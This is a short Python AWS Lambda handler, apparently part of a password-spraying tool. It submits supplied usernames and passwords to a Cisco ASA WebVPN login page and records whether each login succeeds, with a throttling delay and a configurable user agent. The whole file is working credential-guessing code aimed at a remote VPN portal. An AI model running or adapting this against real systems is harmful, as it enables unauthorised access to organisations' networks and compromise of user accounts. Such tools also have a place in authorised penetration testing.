import urllib.request
import datetime
import mechanicalsoup
import bs4
import re
import time

def lambda_handler(event, context):
	url = 'https://' + event['args']['ciscourl'] + '/+CSCOE+/logon.html'
	return cisco_authenticate(event['username'], event['password'], event['useragent'], url)


def cisco_authenticate(username, password, useragent, url):
	ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

	data_response = {
		'timestamp': ts,
		'username': username,
		'password': password,
		'success': False,
                'code': 'NA',
	}
	time.sleep(2.0)
	try:
		browser = mechanicalsoup.StatefulBrowser(
			soup_config={'features': 'html'},
			raise_on_404=True,
			user_agent=useragent
		)
		page = browser.open(url)
		user_form = browser.select_form('form')
		user_form.set('username', username)
		user_form.set('password', password)
		user_response = browser.submit(user_form, page.url)
		if 'a0=15' in user_response.text:
			data_response['success'] = False
		else:
			data_response['success'] = True

	except Exception as ex:
		data_response['error'] = ex
		pass

	return data_response
